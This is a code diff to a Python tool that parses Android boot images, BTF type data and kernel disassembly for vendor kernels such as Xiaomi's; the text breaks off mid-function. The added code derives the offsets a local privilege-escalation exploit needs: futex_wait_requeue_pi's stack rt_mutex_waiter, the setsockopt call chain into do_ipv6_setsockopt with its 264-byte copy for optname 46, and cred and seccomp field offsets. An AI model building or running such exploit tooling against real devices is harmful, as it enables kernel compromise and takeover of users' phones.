@@ -152,10 +152,35 @@ def recover_kernel_phys_load(path: Path) -> int:
         except (IndexError, UnicodeError, ValueError, struct.error):
             continue
     if not candidates:
-        raise ExtractError("xbl_config contains no unique NOMAP/Kernel memory map")
+        return recover_kernel_phys_load_text(path)
     if len(candidates) != 1:
         raise ExtractError(f"xbl_config contains conflicting memory maps: {sorted(candidates)}")
     return next(iter(candidates))[2]
+
+
+def recover_kernel_phys_load_text(path: Path) -> int:
+    """Some vendors (e.g. Xiaomi) carry the XBL memory map as a UEFI-style
+    text table instead of /memorymap/ FDT nodes, e.g.
+    '0xA8000000, 0x10000000, "Kernel", AddMem, SYS_MEM, SYS_MEM_CAP, ...'."""
+    text = path.read_bytes().decode("ascii", "replace")
+    candidates: set[tuple[int, int]] = set()
+    for match in re.finditer(
+        r'0x([0-9A-Fa-f]+)\s*,\s*0x([0-9A-Fa-f]+)\s*,\s*"Kernel"\s*,\s*AddMem',
+        text,
+    ):
+        base, size = int(match.group(1), 16), int(match.group(2), 16)
+        if base & (PAGE_SIZE - 1) or not size:
+            raise ValueError("unaligned or empty text memory map")
+        candidates.add((base, size))
+    if not candidates:
+        raise ExtractError(
+            "xbl_config contains no Kernel memory map (FDT or text)"
+        )
+    if len(candidates) != 1:
+        raise ExtractError(
+            f"xbl_config contains conflicting Kernel maps: {sorted(candidates)}"
+        )
+    return next(iter(candidates))[0]
 
 
 LZ4_LEGACY_MAGIC = b"\x02\x21\x4c\x18"
@@ -223,8 +248,13 @@ class BootImage:
         return cls(path, raw)
 
     def release(self) -> str | None:
-        match = re.search(rb"Linux version ([^\x00\r\n ]+)", self.kernel)
-        return match.group(1).decode("ascii", "replace") if match else None
+        # Skip the printk format string "Linux version %s" and return the
+        # real banner version (starts with a kernel version number).
+        for match in re.finditer(rb"Linux version ([^\x00\r\n ]+)", self.kernel):
+            value = match.group(1).decode("ascii", "replace")
+            if re.match(r"^\d+\.\d+", value):
+                return value
+        return None
 
     def embedded_btf(self) -> bytes | None:
         signature = struct.pack("<HBBI", BTF_MAGIC, 1, 0, 24)
@@ -401,9 +431,40 @@ class Btf:
                         return found
         return None
 
+    def _find_path(
+        self, item: BtfType, segments: list[str], base: int,
+        seen: set[int],
+    ) -> int | None:
+        """Resolve a dotted member path (e.g. `pi_tree.prio`) through named
+        and anonymous struct/union members, returning the byte offset."""
+        if not segments:
+            return base // 8
+        if item.type_id in seen:
+            return None
+        seen = seen | {item.type_id}
+        name = segments[0]
+        for member in item.members:
+            offset = base + member.bit_offset
+            if member.name == name:
+                if len(segments) == 1:
+                    return offset // 8
+                child = self.resolve(member.type_id)
+                if child is not None and child.kind in (KIND_STRUCT, KIND_UNION):
+                    return self._find_path(child, segments[1:], offset, seen)
+                return None
+            if member.name == "":
+                child = self.resolve(member.type_id)
+                if child is not None and child.kind in (KIND_STRUCT, KIND_UNION):
+                    found = self._find_path(child, segments, offset, seen)
+                    if found is not None:
+                        return found
+        return None
+
     def field(self, struct_name: str, field_name: str) -> int | None:
         item = self.struct(struct_name)
-        return self._find_member(item, field_name, 0, set()) if item else None
+        if item is None:
+            return None
+        return self._find_path(item, field_name.split("."), 0, set())
 
     def size(self, struct_name: str) -> int | None:
         item = self.struct(struct_name)
@@ -529,7 +590,9 @@ SYMBOLS = {
 FUNCTIONS = {
     "off_configfs_read_iter": ("configfs_read_iter",),
     "off_configfs_bin_write_iter": ("configfs_bin_write_iter",),
-    "off_copy_splice_read": ("copy_splice_read",),
+    # 5.15 kernels predate copy_splice_read (6.1+); the same splice-read
+    # slot role is served by generic_file_splice_read.
+    "off_copy_splice_read": ("copy_splice_read", "generic_file_splice_read"),
     "off_noop_llseek": ("noop_llseek",),
 }
 
@@ -583,8 +646,21 @@ STRUCT_FIELDS = {
         "task_tasks": "tasks", "task_seccomp": "seccomp",
     },
     "rt_mutex_waiter": {
-        "waiter_tree": "tree", "waiter_pi_tree": "pi_tree", "waiter_task": "task",
-        "waiter_lock": "lock", "waiter_wake_state": "wake_state", "waiter_ww_ctx": "ww_ctx",
+        # 5.15 kernels name the rb-tree entries tree_entry/pi_tree_entry.
+        "waiter_tree": ("tree", "tree_entry"), "waiter_pi_tree": ("pi_tree", "pi_tree_entry"),
+        # 6.x splits tree/pi priorities and deadlines; this Android 5.15
+        # backport keeps a single shared prio/deadline pair.
+        # Some vendor 6.6 kernels wrap rb_node + prio/deadline in a named
+        # rt_waiter_node, so the prio/deadline fields are nested
+        # (tree.prio / pi_tree.prio) instead of flat tree_prio/pi_tree_prio.
+        "waiter_tree_prio": ("tree_prio", "tree.prio", "prio"),
+        "waiter_tree_deadline": ("tree_deadline", "tree.deadline", "deadline"),
+        "waiter_pi_tree_prio": ("pi_tree_prio", "pi_tree.prio", "prio"),
+        "waiter_pi_tree_deadline": (
+            "pi_tree_deadline", "pi_tree.deadline", "deadline",
+        ),
+        "waiter_task": "task", "waiter_lock": "lock",
+        "waiter_wake_state": "wake_state", "waiter_ww_ctx": "ww_ctx",
     },
     "cred": {
         "cred_uid": "uid", "cred_securebits": "securebits",
@@ -615,8 +691,13 @@ def resolve_symbols(
     result: dict[str, int | None] = {}
     for name, (symbol,) in SYMBOLS.items():
         result[name] = unique(symbols, symbol)
-    for name, (symbol,) in FUNCTIONS.items():
-        result[name] = unique(symbols, symbol)
+    for name, candidates in FUNCTIONS.items():
+        value = None
+        for symbol in candidates:
+            value = unique(symbols, symbol)
+            if value is not None:
+                break
+        result[name] = value
     result["off_slide_loggers_0_1"] = (
         unique(symbols, "loggers") + 0x10 if unique(symbols, "loggers") is not None else None
     )
@@ -889,10 +970,13 @@ def derive_pselect_layout(
         )
     frames = {key: first_sp_frame(text, names[key]) for key, text in dis.items()}
 
-    pi_tree = wake_state = None
+    pi_tree = wake_state = task = None
     if btf is not None:
         pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
+        if pi_tree is None:
+            pi_tree = btf.field("rt_mutex_waiter", "pi_tree_entry")
         wake_state = btf.field("rt_mutex_waiter", "wake_state")
+        task = btf.field("rt_mutex_waiter", "task")
         if pi_tree is None or wake_state is None:
             raise ExtractError("BTF rt_mutex_waiter.pi_tree/wake_state missing")
     waiter_candidates: list[tuple[str, int]] = []
@@ -917,6 +1001,27 @@ def derive_pselect_layout(
     waiter_candidates = list(
         {imm: (reg, imm) for reg, imm in waiter_candidates}.values()
     )
+    # 5.15-era kernels also build a futex_q on the stack whose embedded
+    # plist/list node matches the pi_tree add pattern (e.g. sp+0x8 with
+    # node_list at +0x18). rt_mutex_init_waiter is distinctive: it stores
+    # the waiter's own address into tree_entry.__rb_parent_color (base+0)
+    # and NULL into waiter->task (base+task). Require one of those stores
+    # when the pi_tree pattern alone is ambiguous.
+    if len(waiter_candidates) > 1 and pi_tree is not None and task is not None:
+        narrowed: list[tuple[str, int]] = []
+        for reg, imm in waiter_candidates:
+            zero_task = re.search(
+                rf"\bstr\s+xzr,\s*\[sp,\s*#0x{imm + task:x}\]",
+                dis["futex_wait"], re.I,
+            )
+            self_link = re.search(
+                rf"\bstr\s+{re.escape(reg)},\s*\[sp,\s*#0x{imm:x}\]",
+                dis["futex_wait"], re.I,
+            )
+            if zero_task or self_link:
+                narrowed.append((reg, imm))
+        if narrowed:
+            waiter_candidates = narrowed
     if len(waiter_candidates) != 1:
         raise ExtractError(
             f"futex waiter stack local not unique: {waiter_candidates}"
@@ -1021,6 +1126,839 @@ def derive_pselect_layout(
         "chain": "->".join(names[key] for key in pselect_chain),
         "futex_chain": "->".join(names[key] for key in futex_chain),
         **{f"frame_{key}": frames[key] for key in frames},
+    }
+
+
+MCAST_COPY_LEN = 0x108
+MCAST_ROUTE_OPTNAME = 46
+MCAST_SWITCH_INDEX = MCAST_ROUTE_OPTNAME - 1
+MCAST_SOCKET_SYMBOLS = [
+    "__arm64_sys_setsockopt", "__sys_setsockopt", "do_sock_setsockopt",
+    "sock_setsockopt", "sk_setsockopt", "sock_common_setsockopt",
+    "udpv6_setsockopt", "rawv6_setsockopt",
+    "ipv6_setsockopt", "udp_lib_setsockopt", "do_ipv6_setsockopt",
+]
+
+
+def chain_frame_size(text: str, name: str) -> int:
+    """Total stack allocated at function entry. arm64 kernels allocate with
+    `sub sp, sp, #imm`, the pre-indexed `stp x29, x30, [sp, #-imm]!` save, or
+    both (do_ipv6_setsockopt uses stp -0x60 followed by sub -0x260)."""
+    sub = re.search(r"\bsub\s+sp,\s*sp,\s*#0x([0-9a-f]+)", text, re.I)
+    stp = re.search(
+        r"\bstp\s+x29,\s*x30,\s*\[sp,\s*#-(0x[0-9a-f]+)\]", text, re.I
+    )
+    total = (int(sub.group(1), 16) if sub else 0) + (
+        int(stp.group(1), 16) if stp else 0
+    )
+    if not total:
+        raise ExtractError(f"{name} has no explicit frame allocation")
+    return total
+
+
+def _direct_call_targets(text: str) -> set[int]:
+    return {
+        int(addr, 16)
+        for addr in re.findall(r"\bbl\s+0x([0-9a-f]+)", text, re.I)
+    }
+
+
+def _follow_direct(
+    text: str, symbols: dict[str, set[int]], candidates: list[str]
+) -> str:
+    """First candidate whose unique address is a direct bl target of text."""
+    calls = _direct_call_targets(text)
+    for candidate in candidates:
+        address = unique_offset_optional(symbols, candidate)
+        if address is not None and address in calls:
+            return candidate
+    raise ExtractError(
+        f"no direct call to any of {candidates} "
+        f"(calls: {sorted(hex(c) for c in calls)[:8]})"
+    )
+
+
+def _asm_instructions(text: str) -> list[dict[str, object]]:
+    """Parse llvm-objdump lines into {addr, mn, ops, raw} records."""
+    instructions: list[dict[str, object]] = []
+    for line in text.splitlines():
+        match = re.match(
+            r"^\s*([0-9a-f]+):\s+(?:[0-9a-f]{2,8}\s+)?(\S+)(?:\s+(.*))?$",
+            line,
+        )
+        if not match:
+            continue
+        ops = (match.group(3) or "").strip()
+        ops = re.sub(r"\s+<.*>$", "", ops)
+        instructions.append({
+            "addr": int(match.group(1), 16),
+            "mn": match.group(2),
+            "ops": ops,
+            "raw": line.strip(),
+        })
+    if not instructions:
+        raise ExtractError("empty disassembly")
+    return instructions
+
+
+def _branch_target(instruction: dict[str, object]) -> int | None:
+    match = re.search(r"(?<![#\w])0x([0-9a-f]+)", instruction["ops"])
+    return int(match.group(1), 16) if match else None
+
+
+def _apply_sp_operation(
+    instruction: dict[str, object], depth: int, allocated: bool, name: str
+) -> tuple[int, bool]:
+    """Apply the instruction's effect on the live frame size below the
+    function entry SP and return (new_depth, allocated_seen). depth grows
+    when SP moves down (`sub sp` / pre-indexed stores). Raises on unhandled
+    SP modifications."""
+    mn = instruction["mn"]
+    ops = instruction["ops"]
+    imm = re.match(r"^sp,\s*sp,\s*#(0x[0-9a-f]+)$", ops, re.I)
+    if mn == "sub" and imm:
+        return depth + int(imm.group(1), 16), True
+    if mn == "add" and imm:
+        return depth - int(imm.group(1), 16), allocated
+    pre_stp = re.match(
+        r"^([xw]\d+),\s*([xw]\d+),\s*\[sp,\s*#-(0x[0-9a-f]+)\]!$",
+        ops, re.I,
+    )
+    if mn == "stp" and pre_stp:
+        return depth + int(pre_stp.group(3), 16), True
+    pre_str = re.match(
+        r"^([xw]\d+),\s*\[sp,\s*#-(0x[0-9a-f]+)\]!$", ops, re.I,
+    )
+    if mn == "str" and pre_str:
+        return depth + int(pre_str.group(2), 16), True
+    post_ldp = re.match(
+        r"^([xw]\d+),\s*([xw]\d+),\s*\[sp\],\s*#(0x[0-9a-f]+)$",
+        ops, re.I,
+    )
+    if mn == "ldp" and post_ldp:
+        return depth - int(post_ldp.group(3), 16), allocated
+    post_ldr = re.match(
+        r"^([xw]\d+),\s*\[sp\],\s*#(0x[0-9a-f]+)$", ops, re.I,
+    )
+    if mn == "ldr" and post_ldr:
+        return depth - int(post_ldr.group(2), 16), allocated
+    if re.match(r"^sp\s*(,|$)", ops, re.I) and mn in ("mov", "add", "sub"):
+        raise ExtractError(
+            f"{name}: unhandled SP modification `{mn} {ops}`"
+        )
+    return depth, allocated
+
+
+def _successors(
+    instructions: list[dict[str, object]],
+    index: int,
+    kernel: bytes | None,
+    name: str,
+) -> list[int]:
+    """CFG successors of instruction index; calls fall through and `br xN`
+    follows the resolved switch table when the standard
+    adrp+add table / adr base / ldrsw / add / br pattern is present."""
+    instruction = instructions[index]
+    mn = instruction["mn"]
+    if mn in ("ret", "eret"):
+        return []
+    if mn == "br":
+        targets = _jump_table_targets(instructions, index, kernel, name)
+        if targets is None:
+            return []
+        resolved: list[int] = []
+        for target in targets:
+            match = _address_index_optional(instructions, target)
+            if match is not None:
+                resolved.append(match)
+        if not resolved:
+            raise ExtractError(
+                f"{name}: switch table at 0x{instruction['addr']:x} "
+                "resolves to no instruction"
+            )
+        return resolved
+    if mn == "b":
+        target = _branch_target(instruction)
+        if target is None:
+            raise ExtractError("unconditional b without target")
+        return [_index_of_address(instructions, target)]
+    conditional = mn.startswith("b.") or mn in ("cbz", "cbnz", "tbz", "tbnz")
+    if conditional:
+        target = _branch_target(instruction)
+        successors = [index + 1] if index + 1 < len(instructions) else []
+        if target is not None:
+            successors.append(_index_of_address(instructions, target))
+        return successors
+    return [index + 1] if index + 1 < len(instructions) else []
+
+
+def _jump_table_targets(
+    instructions: list[dict[str, object]],
+    index: int,
+    kernel: bytes | None,
+    name: str,
+) -> list[int] | None:
+    """Resolve `br xN` switch targets. Returns None when the instruction is
+    not the tail of the standard dispatch pattern."""
+    if kernel is None:
+        return None
+    match = re.match(r"([xw]\d+)", instructions[index]["ops"])
+    if match is None:
+        return None
+    register = match.group(1)
+    for j in range(max(0, index - 8), index):
+        add = (
+            re.match(
+                rf"{register},\s*{register},\s*(x\d+)",
+                instructions[j]["ops"], re.I,
+            )
+            if instructions[j]["mn"] == "add"
+            else None
+        )
+        if add is None:
+            continue
+        offset_reg = add.group(1)
+        for k in range(max(0, j - 8), j):
+            load = (
+                re.match(
+                    rf"{offset_reg},\s*\[(x\d+),\s*(x\d+),\s*lsl\s*#2\]",
+                    instructions[k]["ops"], re.I,
+                )
+                if instructions[k]["mn"] == "ldrsw"
+                else None
+            )
+            if load is None:
+                continue
+            table_reg = load.group(1)
+            index_reg = load.group(2)
+            table: int | None = None
+            for l in range(max(0, k - 8), k):
+                page = (
+                    re.match(
+                        rf"{table_reg},\s*0x([0-9a-f]+)",
+                        instructions[l]["ops"], re.I,
+                    )
+                    if instructions[l]["mn"] == "adrp"
+                    else None
+                )
+                if page is None:
+                    continue
+                for l2 in range(l + 1, min(len(instructions), l + 4)):
+                    addoff = (
+                        re.match(
+                            rf"{table_reg},\s*{table_reg},\s*#0x([0-9a-f]+)",
+                            instructions[l2]["ops"], re.I,
+                        )
+                        if instructions[l2]["mn"] == "add"
+                        else None
+                    )
+                    if addoff is not None:
+                        table = (int(page.group(1), 16) & ~0xFFF) + int(
+                            addoff.group(1), 16
+                        )
+                        break
+                if table is not None:
+                    break
+            if table is None:
+                continue
+            base: int | None = None
+            for l in range(max(0, j - 8), j):
+                adr = (
+                    re.match(
+                        rf"{register},\s*0x([0-9a-f]+)",
+                        instructions[l]["ops"], re.I,
+                    )
+                    if instructions[l]["mn"] == "adr"
+                    else None
+                )
+                if adr is not None:
+                    base = int(adr.group(1), 16)
+                    break
+            if base is None:
+                continue
+            # Entry count: the `cmp wI, #imm; b.hi` guard immediately before
+            # the dispatch bounds the table; fall back to a generous cap.
+            bound: int | None = None
+            w_index = "w" + index_reg[1:]
+            for l in range(max(0, index - 16), index):
+                cmp_match = (
+                    re.match(
+                        rf"{w_index},\s*#0x([0-9a-f]+)",
+                        instructions[l]["ops"], re.I,
+                    )
+                    if instructions[l]["mn"] == "cmp"
+                    else None
+                )
+                if cmp_match is not None:
+                    bound = int(cmp_match.group(1), 16) + 1
+                    break
+            if bound is None:
+                bound = 0x100
+            targets: list[int] = []
+            for entry in range(bound):
+                table_entry = table + 4 * entry
+                if table_entry + 4 > len(kernel):
+                    break
+                offset = _u32(kernel, table_entry)
+                signed = offset - 0x100000000 if offset >= 0x80000000 else offset
+                targets.append(base + signed)
+            if not targets:
+                raise ExtractError(
+                    f"{name}: switch table 0x{table:x} empty"
+                )
+            return targets
+    return None
+
+
+def _address_index_optional(
+    instructions: list[dict[str, object]], address: int
+) -> int | None:
+    for index, instruction in enumerate(instructions):
+        if instruction["addr"] == address:
+            return index
+    return None
+
+
+def _index_of_address(
+    instructions: list[dict[str, object]], address: int
+) -> int:
+    for index, instruction in enumerate(instructions):
+        if instruction["addr"] == address:
+            return index
+    raise ExtractError(f"branch target 0x{address:x} not an instruction")
+
+
+def sp_depth_at_anchor(
+    text: str, anchor: str, name: str, kernel: bytes | None = None,
+) -> int:
+    """Walk the function CFG from entry and return the frame SP depth at the
+    unique instruction matching `anchor`. All reaching paths must agree on
+    the depth; the anchor must be reachable with at least one allocation."""
+    instructions = _asm_instructions(text)
+    anchors = [
+        index for index, instruction in enumerate(instructions)
+        if re.search(anchor, instruction["raw"], re.I)
+    ]
+    if len(anchors) != 1:
+        raise ExtractError(
+            f"{name}: anchor not unique in {len(anchors)} places"
+        )
+    target = anchors[0]
+    states: dict[int, tuple[int, bool]] = {}
+    states[0] = (0, False)
+    queue = [0]
+    while queue:
+        index = queue.pop(0)
+        if index >= target:
+            continue
+        depth, allocated = states[index]
+        depth, allocated = _apply_sp_operation(
+            instructions[index], depth, allocated, name
+        )
+        for successor in _successors(instructions, index, kernel, name):
+            state = (depth, allocated)
+            if successor not in states:
+                states[successor] = state
+                queue.append(successor)
+            elif states[successor] != state:
+                raise ExtractError(
+                    f"{name}: SP depth diverges at "
+                    f"0x{instructions[successor]['addr']:x}"
+                )
+    if target not in states:
+        raise ExtractError(f"{name}: anchor unreachable from entry")
+    depth, allocated = states[target]
+    if not allocated:
+        raise ExtractError(
+            f"{name}: no frame allocation on the path to the anchor"
+        )
+    if depth < 0:
+        raise ExtractError(f"{name}: negative SP depth at anchor: {depth:#x}")
+    return depth
+
+
+def _futex_waiter_local(
+    text: str, btf: Btf | None, name: str
+) -> int:
+    """Locate futex_wait_requeue_pi's stack rt_mutex_waiter local."""
+    pi_tree = wake_state = task = None
+    if btf is not None:
+        pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
+        if pi_tree is None:
+            pi_tree = btf.field("rt_mutex_waiter", "pi_tree_entry")
+        wake_state = btf.field("rt_mutex_waiter", "wake_state")
+        task = btf.field("rt_mutex_waiter", "task")
+    candidates: list[tuple[str, int]] = [
+        (match.group(1).lower(), int(match.group(2), 16))
+        for match in re.finditer(
+            r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", text, re.I
+        )
+    ]
+    candidates = list(
+        {imm: (reg, imm) for reg, imm in candidates}.values()
+    )
+    if len(candidates) > 1 and pi_tree is not None and task is not None:
+        narrowed: list[tuple[str, int]] = []
+        for reg, imm in candidates:
+            zero_task = re.search(
+                rf"\bstr\s+xzr,\s*\[sp,\s*#0x{imm + task:x}\]",
+                text, re.I,
+            )
+            self_link = re.search(
+                rf"\bstr\s+{re.escape(reg)},\s*\[sp,\s*#0x{imm:x}\]",
+                text, re.I,
+            )
+            if zero_task or self_link:
+                narrowed.append((reg, imm))
+        if narrowed:
+            candidates = narrowed
+    if len(candidates) != 1:
+        raise ExtractError(
+            f"futex waiter stack local not unique: {candidates}"
+        )
+    _, waiter_local = candidates[0]
+    required = [waiter_local]
+    if wake_state is not None:
+        required.append(waiter_local + wake_state)
+    for offset in required:
+        if not re.search(
+            rf"\[sp,\s*#0x{offset:x}\]", text, re.I
+        ):
+            raise ExtractError(
+                f"futex waiter candidate 0x{waiter_local:x} not "
+                f"cross-validated by a real field store at 0x{offset:x}"
+            )
+    return waiter_local
+
+
+def derive_futex_chain(
+    tool: str,
+    kernel_path: Path,
+    symbols: dict[str, set[int]],
+    sorted_offsets: list[int],
+    btf: Btf | None,
+    kernel: bytes | None = None,
+) -> dict[str, object]:
+    """Derive the futex chain, its entry frames and the stack waiter local,
+    anchored at the syscall entry SP (absolute = -sum(frames) + local)."""
+    names = {
+        "futex_wrapper": "__arm64_sys_futex",
+        "futex_dispatch": "do_futex",
+        "futex_wait": "futex_wait_requeue_pi",
+    }
+    present = {
+        key: value
+        for key, value in names.items()
+        if unique_offset_optional(symbols, value) is not None
+    }
+    if "futex_wait" not in present:
+        raise ExtractError("futex_wait_requeue_pi missing from kallsyms")
+    dis = {
+        key: disassemble_symbol(
+            tool, kernel_path, symbols, sorted_offsets, value
+        )
+        for key, value in present.items()
+    }
+    chain = ["futex_wrapper"]
+    wait_addr = unique_offset(symbols, names["futex_wait"])
+    if has_direct_call(dis["futex_wrapper"], wait_addr):
+        chain.append("futex_wait")
+    elif "futex_dispatch" in present and has_direct_call(
+        dis["futex_wrapper"],
+        unique_offset(symbols, names["futex_dispatch"]),
+    ):
+        if not has_direct_call(dis["futex_dispatch"], wait_addr):
+            raise ExtractError(
+                "do_futex does not directly call futex_wait_requeue_pi"
+            )
+        chain += ["futex_dispatch", "futex_wait"]
+    else:
+        raise ExtractError(
+            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi"
+        )
+    hop_depths: dict[str, int] = {}
+    for caller, callee in zip(chain, chain[1:]):
+        hop_depths[names[caller]] = sp_depth_at_anchor(
+            dis[caller],
+            rf"\bbl\s+0x{unique_offset(symbols, names[callee]):x}\b",
+            names[caller], kernel,
+        )
+    frames = {
+        key: chain_frame_size(dis[key], names[key]) for key in chain
+    }
+    waiter_local = _futex_waiter_local(
+        dis["futex_wait"], btf, names["futex_wait"]
+    )
+    frame_sum = sum(hop_depths.values()) + frames["futex_wait"]
+    return {
+        "chain": "->".join(names[key] for key in chain),
+        "frames": {names[key]: frames[key] for key in chain},
+        "hop_depths": hop_depths,
+        "frame_sum": frame_sum,
+        "waiter_local": waiter_local,
+        "waiter_abs": -frame_sum + waiter_local,
+    }
+
+
+def derive_setsockopt_chain(
+    tool: str,
+    kernel_path: Path,
+    symbols: dict[str, set[int]],
+    sorted_offsets: list[int],
+    btf: Btf | None = None,
+    kernel: bytes | None = None,
+) -> dict[str, object]:
+    """Follow the SOL_IPV6 setsockopt chain to do_ipv6_setsockopt for an
+    AF_INET6 DGRAM (UDPv6) socket:
+
+    __arm64_sys_setsockopt -> __sys_setsockopt
+      -> sock->ops->setsockopt (sock_common_setsockopt, indirect blr)
+      -> sk->sk_prot->setsockopt (udpv6_setsockopt, indirect blr)
+      -> [ipv6_setsockopt] -> do_ipv6_setsockopt
+
+    Per-hop stack depth is measured at the actual call site so callers that
+    restore SP before the dispatch (e.g. readmik70 __sys_setsockopt) still
+    produce the exact live depth at do_ipv6_setsockopt."""
+    present = [
+        name for name in MCAST_SOCKET_SYMBOLS
+        if unique_offset_optional(symbols, name) is not None
+    ]
+    dis = {
+        name: disassemble_symbol(
+            tool, kernel_path, symbols, sorted_offsets, name
+        )
+        for name in present
+    }
+    chain = ["__arm64_sys_setsockopt"]
+    sys_name = _follow_direct(
+        dis[chain[0]], symbols, ["__sys_setsockopt"]
+    )
+    chain.append(sys_name)
+    ops_caller = sys_name
+    if (
+        "do_sock_setsockopt" in dis
+        and has_direct_call(
+            dis[sys_name], unique_offset(symbols, "do_sock_setsockopt")
+        )
+    ):
+        # 6.x shape: __sys_setsockopt -> do_sock_setsockopt, which switches
+        # on level and reaches sock->ops->setsockopt for SOL_IPV6.
+        chain.append("do_sock_setsockopt")
+        ops_caller = "do_sock_setsockopt"
+    if "sock_common_setsockopt" not in dis:
+        raise ExtractError(
+            "sock_common_setsockopt missing from kallsyms; "
+            "cannot model the SOL_IPV6 ops->setsockopt hop"
+        )
+    chain.append("sock_common_setsockopt")
+    proto = "udpv6_setsockopt" if "udpv6_setsockopt" in dis else "rawv6_setsockopt"
+    chain.append(proto)
+    current = proto
+    dipv6 = unique_offset(symbols, "do_ipv6_setsockopt")
+    for _ in range(3):
+        if dipv6 in _direct_call_targets(dis[current]):
+            chain.append("do_ipv6_setsockopt")
+            break
+        next_name = None
+        for candidate in ("ipv6_setsockopt", "udp_lib_setsockopt"):
+            address = unique_offset_optional(symbols, candidate)
+            if (
+                candidate in dis
+                and candidate != current
+                and address is not None
+                and address in _direct_call_targets(dis[current])
+            ):
+                next_name = candidate
+                break
+        if next_name is None:
+            raise ExtractError(
+                "setsockopt chain from "
+                f"{current} does not reach do_ipv6_setsockopt"
+            )
+        chain.append(next_name)
+        current = next_name
+    else:
+        raise ExtractError("setsockopt chain is too deep")
+
+    member_off = btf.field("proto_ops", "setsockopt") if btf else None
+    if member_off is None:
+        member_off = 0x70
+    anchors: dict[tuple[str, str], str] = {}
+    for caller, callee in zip(chain, chain[1:]):
+        if (
+            callee != "sock_common_setsockopt"
+            and callee != proto
+            and has_direct_call(
+                dis[caller], unique_offset(symbols, callee)
+            )
+        ):
+            anchors[(caller, callee)] = (
+                rf"\bbl\s+0x{unique_offset(symbols, callee):x}\b"
+            )
+    anchors[(ops_caller, "sock_common_setsockopt")] = _indirect_dispatch_anchor(
+        dis[ops_caller], member_off, ops_caller,
+    )
+    anchors[("sock_common_setsockopt", proto)] = _indirect_dispatch_anchor(
+        dis["sock_common_setsockopt"], None, "sock_common_setsockopt",
+    )
+    hop_depths: dict[str, int] = {}
+    for (caller, callee), anchor in anchors.items():
+        hop_depths[f"{caller}->{callee}"] = sp_depth_at_anchor(
+            dis[caller], anchor, caller, kernel,
+        )
+    frames = {name: chain_frame_size(dis[name], name) for name in chain}
+    frame_sum = (
+        sum(hop_depths.values())
+        + chain_frame_size(dis["do_ipv6_setsockopt"], "do_ipv6_setsockopt")
+    )
+    return {
+        "chain": "->".join(chain),
+        "frames": frames,
+        "hop_depths": hop_depths,
+        "frame_sum": frame_sum,
+        "dis": dis,
+    }
+
+
+def _indirect_dispatch_anchor(
+    text: str, member_off: int | None, name: str
+) -> str:
+    """Anchor regex for the indirect dispatch call. When the caller has more
+    than one blr, resolve the one whose target register was loaded from
+    [xN, #member_off] (e.g. proto_ops.setsockopt)."""
+    instructions = _asm_instructions(text)
+    blrs = [
+        index for index, instruction in enumerate(instructions)
+        if instruction["mn"] == "blr"
+    ]
+    if not blrs:
+        raise ExtractError(f"{name}: no blr dispatch found")
+    if len(blrs) == 1:
+        return r"\bblr\b"
+    if member_off is None:
+        raise ExtractError(
+            f"{name}: {len(blrs)} blrs and no member offset to disambiguate"
+        )
+    matches: list[int] = []
+    for index in blrs:
+        reg = re.match(r"([xw]\d+)", instructions[index]["ops"])
+        if reg is None:
+            continue
+        register = reg.group(1)
+        for j in range(max(0, index - 16), index):
+            if instructions[j]["mn"] == "ldr" and re.search(
+                rf"{register},\s*\[x\d+,\s*#0x{member_off:x}\]",
+                instructions[j]["ops"], re.I,
+            ):
+                matches.append(index)
+                break
+    if len(matches) != 1:
+        raise ExtractError(
+            f"{name}: cannot disambiguate the dispatch blr "
+            f"(blrs={len(blrs)} member_load_matches={len(matches)})"
+        )
+    return rf"\bblr\s+{register}\b"
+
+
+def _find_mcast_copy_sites(text: str) -> list[tuple[int, int]]:
+    """All (copy_off, instruction_address) pairs where do_ipv6_setsockopt
+    copies MCAST_COPY_LEN bytes onto the stack."""
+    sites: list[tuple[int, int]] = []
+    lines = text.splitlines()
+    for index, line in enumerate(lines):
+        if not re.search(r"\bmov\s+w\d+,\s*#0x108\b", line, re.I):
+            continue
+        head = re.match(r"^\s*([0-9a-f]+):", line)
+        if not head:
+            continue
+        site_addr = int(head.group(1), 16)
+        for j in range(max(0, index - 8), min(len(lines), index + 8)):
+            match = re.search(
+                r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)",
+                lines[j], re.I,
+            )
+            if match:
+                sites.append((int(match.group(2), 16), site_addr))
+                break
+    return sites
+
+
+def _resolve_mcast_case(
+    kernel: bytes, text: str, sites: list[tuple[int, int]]
+) -> dict[str, int]:
+    """Resolve the optname switch in do_ipv6_setsockopt and pick the 264-byte
+    copy site reached by optname 46 (0-based case index 45)."""
+    lines = text.splitlines()
+    switch = None
+    for index, line in enumerate(lines):
+        match = re.match(
+            r"^\s*[0-9a-f]+:\s+(?:[0-9a-f]{2,8}\s+)?"
+            r"cmp\s+w([0-9]+),\s*#0x([0-9a-f]+)\b",
+            line, re.I,
+        )
+        if not match:
+            continue
+        index_reg = match.group(1)
+        max_value = int(match.group(2), 16)
+        # The optname guard is `cmp wI, #imm; b.cond` straight into the
+        # table setup. Older false positives (e.g. the AF_INET6 family
+        # check `cmp w8, #0xa`) are followed by unrelated work, not by a
+        # conditional branch, so require one right after the cmp.
+        if index + 1 >= len(lines) or not re.search(
+            r"\bb\.(hi|hs|lo|ls|ge|gt|le|lt|eq|ne)\b",
+            lines[index + 1], re.I,
+        ):
+            continue
+        window = "\n".join(lines[index:index + 14])
+        table_page = re.search(
+            r"\badrp\s+x\d+,\s*0x([0-9a-f]+)\b", window, re.I
+        )
+        table_add = re.search(
+            r"\badd\s+x\d+,\s*x\d+,\s*#0x([0-9a-f]+)\b", window, re.I
+        )
+        # Some 5.15 kernels index the switch table with the 64-bit form
+        # (`ldrsw xN, [xT, xI, lsl #2]`) while the guard compares the
+        # 32-bit pair (`cmp wI, #imm`); accept either.
+        loadsw = re.search(
+            rf"\bldrsw\s+x\d+,\s*\[x\d+,\s*[wx]{index_reg},\s*lsl\s*#2\]",
+            window, re.I,
+        )
+        adr_base = re.search(
+            r"\badr\s+x\d+,\s*0x([0-9a-f]+)\b", window, re.I
+        )
+        branch = re.search(r"\bbr\s+x\d+\b", window, re.I)
+        if table_page and table_add and loadsw and adr_base and branch:
+            # The guard register must not be rewritten between the cmp and
+            # the table setup: real switches keep the `sub wI, wM, #1`
+            # index until the `br`, while unrelated cmps are followed by a
+            # fresh index computation (e.g. `sub w8, w20, #0x1` after the
+            # family check) that would break the mapping.
+            adrp_line = next(
+                (
